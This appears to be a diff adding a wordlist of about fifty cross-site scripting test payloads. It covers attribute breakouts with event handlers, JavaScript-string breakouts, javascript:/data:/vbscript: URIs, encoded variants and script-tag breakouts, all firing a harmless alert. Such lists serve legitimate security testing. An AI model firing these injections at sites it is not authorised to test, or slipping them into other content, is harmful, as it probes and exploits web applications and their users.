@@ -1,0 +1,50 @@
+" onmouseover=alert(1)
+" onclick=alert(1)
+" onfocus=alert(1) autofocus
+" onmouseenter=alert(1)
+" onload=alert(1)
+" onpointerenter=alert(1)
+" onanimationstart=alert(1)
+" ontransitionend=alert(1)
+" onerror=alert(1)
+" style=animation-name:x;animation-duration:1s onanimationstart=alert(1)
+" style=background:url(javascript:alert(1))
+" style=color:red onmouseover=alert(1)
+" autofocus onfocus=alert(1)
+' onmouseover=alert(1)
+' onclick=alert(1)
+' onfocus=alert(1) autofocus
+' onmouseenter=alert(1)
+' onload=alert(1)
+' onpointerenter=alert(1)
+' onanimationstart=alert(1)
+' ontransitionend=alert(1)
+' onerror=alert(1)
+' style=animation-name:x;animation-duration:1s onanimationstart=alert(1)
+' style=background:url(javascript:alert(1))
+' style=color:red onmouseover=alert(1)
+';alert(1);// 
+";alert(1);// 
+`;alert(1)// 
+');alert(1)//
+");alert(1)//
+"};alert(1);// 
+'};alert(1);// 
+javascript:alert(1)
+javascript:prompt(1)
+javascript:confirm(1)
+data:text/html,alert(1)
+vbscript:msgbox("XSS")
+&#34; onmouseover=alert(1)
+&#x22; onmouseover=alert(1)
+&quot; onmouseover=alert(1)
+%22%20onmouseover%3Dalert(1)
+%27%20onfocus%3Dalert(1)%20autofocus
+%2522%2520onerror%253Dalert(1)
+" onclick="location='javascript:alert(1)'
+" onmouseover="location='javascript:alert(1)'
+" onmouseover="alert(String.fromCharCode(88,83,83))
+javascript:void(alert(1))
+</script><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+';alert(String.fromCharCode(88,83,83))//
